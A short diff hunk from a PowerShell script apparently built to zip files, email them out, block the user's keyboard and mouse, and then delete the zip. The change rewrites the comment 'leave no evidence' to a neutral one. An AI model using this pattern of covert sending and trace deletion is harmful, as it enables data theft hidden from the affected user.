@@ -95,7 +95,7 @@ $Attachment.Dispose()
 $Msg.Dispose()
 $Mailer.Dispose()
 
-#Delete the zip file (leave no evidence)
+#Delete the zip file created
 $del = Remove-Item $ZipFolder -Force -Recurse
 
 #Disable temporary user keyboard and mouse input block
